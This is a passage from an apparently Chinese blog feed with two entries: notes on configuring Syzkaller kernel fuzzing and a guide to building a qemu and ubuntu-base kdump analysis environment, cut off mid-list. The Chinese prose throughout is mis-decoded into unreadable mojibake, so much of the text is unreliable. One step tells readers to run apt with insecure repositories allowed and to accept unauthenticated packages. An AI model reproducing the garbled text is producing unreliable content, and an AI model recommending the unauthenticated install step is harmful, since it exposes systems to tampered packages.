    <id>https://zjw1nd.github.io/2025/03/24/%E5%86%85%E6%A0%B8fuzzing-Syzkaller%E5%88%9D%E6%8E%A2/</id>
    <published>2025-03-24T08:33:28.000Z</published>
    <updated>2025-03-30T08:01:26.347Z</updated>
    
    <content type="html"><![CDATA[<h1>ç¯å¢ƒé…ç½®</h1><h2 id="å†…æ ¸ç¼–è¯‘">å†…æ ¸ç¼–è¯‘</h2><p>å†…æ ¸éœ€è¦å¼€å¯çš„é€‰é¡¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_KCOV=y</span><br><span class="line">CONFIG_DEBUG_INFO=y # å…¶ä»–çš„debugä¿¡æ¯å¯ä»¥è‡ªè¡Œé€‰æ‹©</span><br><span class="line">CONFIG_KASAN=y</span><br><span class="line">CONFIG_KASAN_INLINE=y</span><br><span class="line"># ä¸å¼€ä¸‹é¢çš„è¿™ä¿©qemuä¸­systemdä¼šæŠ¥é”™æŒ‚ä¸ä¸Šæ–‡ä»¶ç³»ç»Ÿ</span><br><span class="line">CONFIG_CONFIGFS_FS=y</span><br><span class="line">CONFIG_SECURITYFS=y</span><br><span class="line"># å†…ç½®cmdlineè§£å†³æ²¡ç½‘å¡/æ— æ³•è”ç½‘çš„é—®é¢˜ï¼Œä¹Ÿå¯ä»¥åœ¨syz-managerçš„cfgæ–‡ä»¶é‡Œé…ç½®</span><br><span class="line">CONFIG_CMDLINE_BOOL=y</span><br><span class="line">CONFIG_CMDLINE=&quot;net.ifnames=0&quot;</span><br></pre></td></tr></table></figure><h2 id="disk-image">disk image</h2><p>disk imageç”¨å®˜æ–¹æä¾›çš„è„šæœ¬ï¼Œå½“ç„¶åˆæœ‰æŒ‚è½½ç›¸å…³çš„é—®é¢˜ï¼Œæœ‰äº†ä¸Šæ¬¡çš„ç»éªŒç›´æ¥ç”¨dockerè·‘åº”è¯¥å°±è¡Œã€‚</p><h2 id="fuzzè·‘ä¸åŠ¨">fuzzè·‘ä¸åŠ¨</h2><p>è¿ä¸ä¸Šæœºå™¨ï¼ŒæŸ¥çœ‹æ—¥å¿—è¯´æ˜¯fuzzæ‰§è¡Œsyz-executorçš„æ—¶å€™segfaultï¼Œgdbè°ƒäº†ä»¥ä¸‹çœ‹äº†çœ¼backtraceï¼Œpieçš„é—®é¢˜ï¼Ÿè¿™ç©æ„ä¸æ˜¯é™æ€ç¼–è¯‘çš„å—ï¼Ÿé‚ä¸Šç½‘æœç´¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[  451.736541] syz-executor[249]: segfault at 7f6b8b5df3f8 ip 00007f6b8bb6b090 sp 00007ffde599aaa0 error 4 in syz-executor[7f6b8b9e7000+1]</span><br><span class="line">[  451.738294] Code: 08 66 0f d4 c1 4c 8b 51 08 66 49 0f 7e c0 4b 8d 0c 2a 4c 0f 45 d1 48 39 d8 73 3b 66 66 2e 0f 1f 84 00 00 00 00 00 0fb</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM / x86-64 / set emulate on ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> â–º 0x7ffff71cc090 &lt;_dl_relocate_static_pie+1040&gt;    mov    rcx, qword ptr [rax]         &lt;Cannot dereference [0x7ffff6c403f8]&gt;</span><br><span class="line">   0x7ffff71cc093 &lt;_dl_relocate_static_pie+1043&gt;    mov    edx, dword ptr [rax + 8]</span><br><span class="line">   0x7ffff71cc096 &lt;_dl_relocate_static_pie+1046&gt;    add    rcx, r13</span><br><span class="line">   0x7ffff71cc099 &lt;_dl_relocate_static_pie+1049&gt;    cmp    rdx, 0x26</span><br><span class="line">   0x7ffff71cc09d &lt;_dl_relocate_static_pie+1053&gt;    je     _dl_relocate_static_pie+1065 &lt;_dl_relocate_static_pie+1065&gt;</span><br><span class="line"> </span><br><span class="line">   0x7ffff71cc09f &lt;_dl_relocate_static_pie+1055&gt;    cmp    rdx, 8</span><br><span class="line">   0x7ffff71cc0a3 &lt;_dl_relocate_static_pie+1059&gt;    jne    _dl_relocate_static_pie.cold+62 &lt;_dl_relocate_static_pie.cold+62&gt;</span><br><span class="line"> </span><br><span class="line">   0x7ffff71cc0a9 &lt;_dl_relocate_static_pie+1065&gt;    mov    rdx, qword ptr [rax + 0x10]</span><br><span class="line">   0x7ffff71cc0ad &lt;_dl_relocate_static_pie+1069&gt;    add    rax, 0x18</span><br><span class="line">   0x7ffff71cc0b1 &lt;_dl_relocate_static_pie+1073&gt;    add    rdx, r13</span><br><span class="line">   0x7ffff71cc0b4 &lt;_dl_relocate_static_pie+1076&gt;    mov    qword ptr [rcx], rdx</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">00:0000â”‚ rsp 0x7fffffffde30 â—‚â€” 0x40 /* &#x27;@&#x27; */</span><br><span class="line">01:0008â”‚-0a8 0x7fffffffde38 â—‚â€” 0xa /* &#x27;\n&#x27; */</span><br><span class="line">02:0010â”‚-0a0 0x7fffffffde40 â—‚â€” 0xffffffffffffffff</span><br><span class="line">03:0018â”‚-098 0x7fffffffde48 â—‚â€” 0x100</span><br><span class="line">04:0020â”‚-090 0x7fffffffde50 â—‚â€” 0x800</span><br><span class="line">05:0028â”‚-088 0x7fffffffde58 â—‚â€” 0x1940000</span><br><span class="line">06:0030â”‚-080 0x7fffffffde60 â€”â–¸ 0x7fffffffdeb0 â—‚â€” 0</span><br><span class="line">07:0038â”‚-078 0x7fffffffde68 â€”â–¸ 0x7fffffffde98 â—‚â€” 0</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> â–º 0   0x7ffff71cc090 _dl_relocate_static_pie+1040</span><br><span class="line">   1   0x7ffff7146cb6 __libc_start_main_impl+102</span><br><span class="line">   2   0x7ffff7050885 _start+37</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç»“æœè¿˜çœŸè®©æˆ‘æœåˆ°äº†ï¼š<br><a href="https://sourceware.org/bugzilla/show_bug.cgi?id=32761">https://sourceware.org/bugzilla/show_bug.cgi?id=32761</a></p><p><a href="https://www.mail-archive.com/bug-binutils@gnu.org/msg49517.html">https://www.mail-archive.com/bug-binutils@gnu.org/msg49517.html</a></p><p>glibc2.41çš„é—®é¢˜ï¼Œé‚£å°±ç”¨æˆ‘ä»¬ç»å…¸çš„è§£å†³æ–¹æ¡ˆï¼Œæ¢åˆ°dockeré‡ŒæŒ‚è½½ä¹‹åé‡æ–°ç¼–è¯‘syzkallerå°±èƒ½è§£å†³ã€‚</p><h1>ç”¨æ³•</h1><p>ç”¨cfgæ–‡ä»¶æŒ‡å®šæˆ‘ä»¬çš„ç›®æ ‡ï¼Œå¯åŠ¨syzkallerä¹‹åç”¨webå‰ç«¯è§‚å¯Ÿç»“æœã€‚</p><p>å¯ä»¥fuzzé©±åŠ¨</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;ç¯å¢ƒé…ç½®&lt;/h1&gt;
&lt;h2 id=&quot;å†…æ ¸ç¼–è¯‘&quot;&gt;å†…æ ¸ç¼–è¯‘&lt;/h2&gt;
&lt;p&gt;å†…æ ¸éœ€è¦å¼€å¯çš„é€‰é¡¹ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;</summary>
      
    
    
    
    <category term="Exploit" scheme="https://zjw1nd.github.io/categories/Exploit/"/>
    
    
    <category term="kernel" scheme="https://zjw1nd.github.io/tags/kernel/"/>
    
    <category term="fuzzing" scheme="https://zjw1nd.github.io/tags/fuzzing/"/>
    
  </entry>
  
  <entry>
    <title>åŸºäºqemuå’Œubuntu-baseçš„kdumpåˆ†æç¯å¢ƒ</title>
    <link href="https://zjw1nd.github.io/2025/03/21/%E5%9F%BA%E4%BA%8Eqemu%E5%92%8Cubuntu-base%E7%9A%84kdump%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83/"/>
    <id>https://zjw1nd.github.io/2025/03/21/%E5%9F%BA%E4%BA%8Eqemu%E5%92%8Cubuntu-base%E7%9A%84kdump%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83/</id>
    <published>2025-03-21T08:45:28.000Z</published>
    <updated>2025-06-01T07:37:43.278Z</updated>
    
    <content type="html"><![CDATA[<p>OSæ¯”èµ›çš„ç¯å¢ƒæ­å»ºæŠ˜ç£¨äº†æˆ‘ä¸¤å¤©ï¼Œå› æ­¤æœ‰å¿…è¦åœ¨è¿™é‡Œè®°å½•ä¸‹å…¨è¿‡ç¨‹ï¼Œä»¥åè‡ªå·±æƒ³ç”¨ä»€ä¹ˆç³»ç»Ÿä¹Ÿä¼šæ–¹ä¾¿ä¸€ç‚¹ã€‚è€Œä¸”ç½‘ä¸Šçš„blogå¯¹äºå‘æ˜¯åªå­—ä¸æå•Šæˆ‘æ—¥ã€‚</p><p>ç›®å‰èƒ½å¤Ÿå®Œç¾è¿è¡Œkdumpçš„ç¯å¢ƒï¼ŒåŸºäºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">QEMU emulator version 9.2.2</span><br><span class="line">Kernel: 6.13.7-arch1-1</span><br><span class="line">è™šæ‹Ÿæœºä¸»å†…æ ¸: linux-6.13.7(compiled from src)</span><br><span class="line">è™šæ‹Ÿæœºå‰¯å†…æ ¸: linux-5.4.10</span><br><span class="line">æ ¹æ–‡ä»¶ç³»ç»Ÿ: UbuntuBase20.04</span><br></pre></td></tr></table></figure><h1>1. Kernel</h1><h2 id="ä¸»å†…æ ¸ï¼Œå³å¯åŠ¨åŠ è½½çš„å†…æ ¸">ä¸»å†…æ ¸ï¼Œå³å¯åŠ¨åŠ è½½çš„å†…æ ¸</h2><p>è¦æƒ³è¿è¡Œqemu-system, é¦–å…ˆå½“ç„¶éœ€è¦ä¸€ä¸ªè‡ªå®šä¹‰çš„å†…æ ¸ã€‚å¯¹äºéœ€è¦è°ƒè¯•çš„å†…æ ¸ï¼Œæˆ‘ä»¬å¾…ä¼šè¦ç”¨åˆ°æ ¸å¿ƒè½¬å‚¨æ–‡ä»¶å’Œå¸¦æœ‰è°ƒè¯•ä¿¡æ¯çš„æ— å‹ç¼©å†…æ ¸ï¼Œå› æ­¤ï¼Œä»å®˜ç½‘ä¸‹è½½æºç åï¼Œè¦æ‰“å¼€è¿™äº›ç¼–è¯‘é€‰é¡¹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_KEXEC=y</span><br><span class="line">CONFIG_SYSFS=y</span><br><span class="line"></span><br><span class="line">CONFIG_CRASH_DUMP=y</span><br><span class="line">CONFIG_PROC_VMCORE=y</span><br><span class="line">CONFIG_RELOCATABLE=y</span><br><span class="line"></span><br><span class="line">CONFIG_DEBUG_INFO=y</span><br><span class="line">CONFIG_DEBUG_INFO_REDUCED=n</span><br><span class="line">CONFIG_DEBUG_INFO_DWARF4=y</span><br><span class="line">CONFIG_DEBUG_FS=y # idkè¿™ä¸ªéšä¾¿å¼€çš„</span><br></pre></td></tr></table></figure><p>è¿™äº›é€‰é¡¹æ˜¯ä»å„ç§ç½‘ç«™åšå®¢ä¹‹ç±»æ”¶é›†æ¥çš„ï¼Œæˆ‘ä½¿ç”¨çš„buildè„šæœ¬æ˜¯åœ¨<a href="https://github.com/pwncollege/pwnkernel">pwncollegeæä¾›çš„è„šæœ¬</a>åŸºç¡€ä¸Šåšçš„ä¿®æ”¹ï¼Œæˆ‘ä¹ŸåŒæ ·å»ºè®®ä½ åœ¨å„ç§åœ°æ–¹ä½¿ç”¨è¿™ä¸ªè„šæœ¬æ¥æ„å»ºå’Œå¯åŠ¨å†…æ ¸ã€‚æœ€ç»ˆçš„buildè„šæœ¬<a href="/files/build.sh">åœ¨è¿™é‡Œ</a>ã€‚</p><h2 id="éœ€è¦æ³¨æ„çš„æ˜¯â€¦">éœ€è¦æ³¨æ„çš„æ˜¯â€¦</h2><p>é¦–å…ˆï¼Œcrashå·¥å…·çš„æœ¬è´¨æ˜¯ä¸€ä¸ªgdbçš„å¥—å£³ã€‚æˆ‘çš„arch pacmanå®‰è£…çš„æœ€æ–°crashé‡Œé¢çš„gdbç‰ˆæœ¬ä¹Ÿæ‰åˆ°7.4ï¼Œæ‰€ä»¥å®ƒä¸æ”¯æŒdwarf5æ ¼å¼çš„è°ƒè¯•ä¿¡æ¯ï¼Œéœ€è¦<strong>æ”¹æˆdwarf4</strong>ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚</p><p>å…¶æ¬¡ï¼Œå¯¹äºå®¿ä¸»æœºæ¥è¯´ï¼Œå¦‚æœä½ æƒ³ç¼–è¯‘ä¸€ä¸ªæ¯”è¾ƒä½ç‰ˆæœ¬çš„å†…æ ¸ï¼Œéœ€è¦æ³¨æ„è‡ªå·±çš„gccç‰ˆæœ¬ã€‚æˆ‘å¼€å§‹åœ¨è¯•å›¾ç¼–è¯‘ä¸€ä¸ªubuntu20.04çš„5.4.1å†…æ ¸çš„æ—¶å€™ï¼Œä¼šä¸€ç›´æŠ¥é”™è¯´UAFçš„æ£€æŸ¥ä¸è¿‡ã€‚è¿™ç§æƒ…å†µï¼Œä½ æœ‰ä¸¤ç§é€‰æ‹©ï¼Œä¸€æ˜¯<strong>ç”¨dockerï¼ˆä¹Ÿå¯ä»¥è¯•è¯•åŒ…ç®¡ç†å™¨ä½†æ˜¯æœ‰ç‚¹æï¼‰å®‰è£…ä¸€ä¸ªä½ç‰ˆæœ¬çš„gccç¯å¢ƒ</strong>ï¼Œæ¨ègcc8ã€‚docker pullå°±å¯ä»¥ã€‚è¿™ä¹‹ååœ¨dockeré‡Œé¢å»ç¼–è¯‘å†…æ ¸ã€‚ï¼ˆæˆ‘å¿˜è®°æ˜¯-væ˜ å°„è¿˜æ˜¯dockerå†…cloneçš„æºç äº†ï¼‰</p><p>äºŒæ˜¯æŠ›å¼ƒä½ç‰ˆæœ¬çš„å†…æ ¸ï¼Œä½¿ç”¨é«˜ç‰ˆæœ¬å†…æ ¸ï¼Œä½¿ç”¨å’Œä½ çš„å®¿ä¸»æœºä¸€è‡´çš„å†…æ ¸ç‰ˆæœ¬æœ€å¥½ã€‚å½“ç„¶ï¼Œå¯èƒ½ä¼šæœ‰çš„é—®é¢˜æˆ‘ä»¬åé¢å†è¯´ã€‚</p><h1>2. æ–‡ä»¶é•œåƒ</h1><blockquote><p>å‚è€ƒ <a href="https://www.cnblogs.com/wsg1100/p/13127636.html#23">https://www.cnblogs.com/wsg1100/p/13127636.html#23</a></p></blockquote><p>ç”±äºkdumpç›¸å…³çš„å·¥å…·é“¾åœ¨ubuntuçš„ä»“åº“ä¸­å¾ˆå…¨è€Œä¸”å¯ä»¥aptä¸€é”®å®‰è£…ï¼Œå› æ­¤æˆ‘å»ºè®®åŸºäºubuntu-baseå»æ„å»ºrootfsã€‚</p><p>è¿™é‡Œæˆ‘ç”¨çš„æ˜¯ubuntu20.04çš„ubuntu-baseã€‚é¦–å…ˆä»<a href="https://cdimage.ubuntu.com/ubuntu-base/releases/focal/release/">å®˜ç½‘</a>æˆ–è€…é•œåƒç«™ä¸‹è½½ubuntu-baseçš„taråŒ…ï¼Œæ¥ç€é¦–å…ˆåˆ›å»ºä¸€ä¸ªç©ºçš„é•œåƒï¼Œæˆ‘ä½¿ç”¨çš„æ˜¯qemu-imgï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-img create -f raw rootfs.img 4G</span><br></pre></td></tr></table></figure><p>å½“ç„¶ä¹Ÿå¯ä»¥ç”¨dd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># è¿™æ˜¯10G!</span><br><span class="line">dd if=/dev/zero of=ubuntu_base.img bs=1G count=10</span><br></pre></td></tr></table></figure><p>å†™å¥½åç”¨mkfs.ext4å¯¹å®ƒè¿›è¡Œåˆå§‹åŒ–ã€‚</p><p><font color=red><b>âš ï¸æ³¨æ„ï¼mkfså·¥å…·å’Œå†…æ ¸çš„ç‰ˆæœ¬æ˜¯ç›¸å…³çš„ã€‚å¯¹äºæ–°çš„å†…æ ¸å…¶èƒ½å¤Ÿæ”¯æŒæ›´æ–°çš„ext4ç‰¹æ€§ï¼Œä½†æ˜¯è¿™æ ·åˆ›å»ºçš„é•œåƒä¼šå¯¼è‡´ä½ç‰ˆæœ¬çš„å†…æ ¸æ— æ³•æŒ‚è½½rootfsï¼Œåªèƒ½åœ¨initramfsé‡Œã€‚è¿™ä¸€é—®é¢˜æˆ‘æ’æŸ¥äº†å¾ˆé•¿æ—¶é—´æ‰å‘ç°ã€‚å¦‚æœä½ çš„å®¿ä¸»æœºå†…æ ¸æ¯”è¾ƒæ–°ï¼Œä¸ºäº†é¿å…ç›¸å…³æƒ…å†µï¼Œå¯ä»¥ä½¿ç”¨ä½ç‰ˆæœ¬ubuntuçš„dockerå†…æä¾›çš„mkfs</b></font><br>å¯ä»¥å°è¯•ä½¿ç”¨<code>tune2fs -l your.img | grep Features</code>æ¥æŸ¥çœ‹ç›¸å…³çš„ç‰¹æ€§ã€‚å¦‚æœä½ åœ¨åˆ‡æ¢å†…æ ¸æ—¶æ— æ³•è¿›å…¥æ ¹æ–‡ä»¶ç³»ç»Ÿå¹¶ä¸”æ—¥å¿—ä¸­æåˆ°ext4çš„é—®é¢˜ï¼Œè¯•ç€ç”¨ä½ç‰ˆæœ¬çš„mkfsé‡æ–°åˆ›å»ºé•œåƒã€‚</p><blockquote><p>å¯¹äºæŠ¥é”™ä¸æ”¯æŒç‰¹æ€§çš„ä»£ç ï¼Œå¯ä»¥åœ¨<a href="https://web.git.kernel.org/pub/scm/fs/ext2/e2fsprogs.git/tree/lib/ext2fs/ext2_fs.h#n810">è¿™é‡Œ</a>æŸ¥çœ‹ã€‚æŒ‰ç†è¯´ï¼Œtune2fs -O å‚æ•°å¯ä»¥ç”¨^featureå…³é—­ç‰¹æ€§ï¼Œä½†æ˜¯æˆ‘è‡ªå·±å°è¯•çš„æ—¶å€™å¹¶ä¸èƒ½ç”Ÿæ•ˆã€‚</p></blockquote><p>ç„¶åï¼Œmountä¸Šè¿™ä¸ªæ–‡ä»¶ï¼ˆæˆ‘çš„ç³»ç»Ÿä¸éœ€è¦é¢å¤–å‚æ•°ï¼Œç›´æ¥sudo mount img dirå°±å¯ä»¥ï¼‰ï¼Œå°†ubuntubaseè§£å‹è¿›æ–‡ä»¶å¤¹ã€‚</p><p>æ¥ç€ï¼Œå¦‚æœä½ æ˜¯ubuntuç³»ç»Ÿï¼Œå°±å¯ä»¥å°†ä½ è‡ªå·±çš„é•œåƒæºï¼Œdnsç­‰æ‹·è¿›å»ã€‚ä½†æ˜¯ä»0å¼€å§‹æ€»æ˜¯å¥½çš„ã€‚</p><h2 id="ç›¸å…³çš„é…ç½®">ç›¸å…³çš„é…ç½®</h2><p>apt sourceä½äº<code>/etc/apt/sources.list</code>. åœ¨ä½ çš„å®¿ä¸»æœºä¸Šæ”¹æ‰å®ƒï¼Œæ¢æºå°±ä¸èµ˜è¿°äº†ã€‚æ¥ç€æ˜¯dnsï¼Œè¿™ä¸ªæ–‡ä»¶åˆ™æ˜¯<code>/etc/resolv.conf</code>ï¼Œå¯ä»¥æ‹·è´ä½ ä¸»æœºçš„æ–‡ä»¶è¿‡å»ï¼Œä¹Ÿå¯ä»¥ç›´æ¥å†™å…¥<code>nameserver 8.8.8.8</code>æˆ–114ã€‚</p><p>ç„¶åchrootè¿›å»ç”¨aptå¼€å§‹è£…ä¸œè¥¿ï¼Œè™šæ‹Ÿæ–‡ä»¶ç³»ç»ŸåŒ…æ‹¬/dev, /procè¿™äº›å¯ä»¥ä¸æŒ‚è½½ï¼Œç”¨å¤„ä¸å¤§ã€‚apt warningä¸ç”¨ç®¡ï¼Œéƒ½æ˜¯æ—¥å¿—æ²¡ä½ç½®è¾“å‡ºä¹‹ç±»çš„ã€‚ç›®å‰ï¼Œæˆ‘ä»¬çš„baseé‡Œæ²¡æœ‰å…¬é’¥ï¼Œæ‰€ä»¥æ¢æºåæ‰§è¡Œupdateå¦‚æœè¯´æ²¡æœ‰gpgä»€ä¹ˆçš„ï¼Œè¿™æ ·è·‘ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get udpate --allow-insecure-repositories</span><br></pre></td></tr></table></figure><p>ç„¶åç›´æ¥aptinstallç›¸åº”çš„ä¸œè¥¿ï¼Œæç¤ºæ— è®¤è¯çš„æ—¶å€™é€‰yä¸è¦é»˜è®¤Nç›´æ¥è£…å°±è¡Œäº†ã€‚</p><p><strong>ä¸‹é¢aptè¦è£…çš„ä¸œè¥¿å¾ˆé‡è¦</strong>ï¼Œå°‘äº†çš„è¯åé¢ä¼šå¾ˆç—›è‹¦ã€‚</p><p>é¦–å…ˆé…ç½®è¿™äº›ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt install locales language-pack-en-base</span><br><span class="line">echo &quot;LANG=en_US.UTF-8&quot; &gt; /etc/locale.conf</span><br><span class="line">echo &quot;test&quot; &gt; /etc/hostname</span><br><span class="line">apt-get install bash-completion</span><br></pre></td></tr></table></figure><p><code>/etc/hosts</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 localhost</span><br><span class="line">127.0.0.1 test</span><br><span class="line">127.0.1.1 test.localdomain test</span><br></pre></td></tr></table></figure><p>ç„¶åæ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install init vim -y</span><br></pre></td></tr></table></figure><p><font color=yellow>ä¸€å®šè¦å®‰è£…initåŒ…ï¼ä¸€å®šè¦å®‰è£…initåŒ…ï¼ä¸€å®šè¦å®‰è£…initåŒ…ï¼</font>ä¸ç„¶ä½ çš„ç”µè„‘ä¼šæ²¡æœ‰rebootå’Œshutdownå‘½ä»¤ï¼Œåªèƒ½qemuå…³é—­ï¼Œkdumpæ— æ³•è‡ªåŠ¨è§¦å‘é‡å¯ã€‚</p><p>åœ¨è¿™é‡Œå¯é€‰å®‰è£…/bootä¸‹çš„å†…æ ¸å’Œinitrdï¼Œå¦‚æœä½ æœ‰è‡ªå·±çš„ç¬¬äºŒå†…æ ¸å¯ä»¥è‡ªå·±copyè¿›å»æä¾›ç»™kexecï¼Œæˆ‘æ˜¯ä½¿ç”¨çš„ç°æˆçš„å†…æ ¸å’Œinitrdã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install linux-image-kvm</span><br><span class="line"># ï¼ˆä¸ä¸€å®šæ˜¯è¿™ä¸ªï¼Œå¯ä»¥æœç´¢å®‰è£…å½“å‰baseç‰ˆæœ¬æˆ–æ›´ä½ç‰ˆæœ¬çš„å†…æ ¸å’Œheaderï¼‰</span><br></pre></td></tr></table></figure><p>æœ€åå®‰è£…kdumpï¼Œå¯ä»¥å‚è€ƒ<a href="https://documentation.ubuntu.com/server/how-to/software/kernel-crash-dump/index.html">æ›´è¯¦ç»†çš„doc</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt install linux-crashdump kexec-tools crash</span><br><span class="line"># linux-crashdump: å…¨å¥—ï¼ŒæŒ‰ç†è¯´è£…è¿™ä¸€ä¸ªå°±å¯ä»¥ï¼ŒåŒ…å«kdump-toolsï¼Œkexec-tools</span><br><span class="line"># crash: åˆ†æå·¥å…·ï¼Œæˆ‘å»ºè®®å®¿ä¸»æœºè£…</span><br></pre></td></tr></table></figure><p>å®‰è£…è¿‡ç¨‹ä¸­ä¼šé—®é…ç½®ï¼Œè‡ªå·±é€‰å³å¯ã€‚</p><p>è¿™æ˜¯æˆ‘çš„baseç³»ç»Ÿæœ€ç»ˆ<code>apt list --installed</code>çš„ç»“æœï¼Œä¾›å‚è€ƒï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span 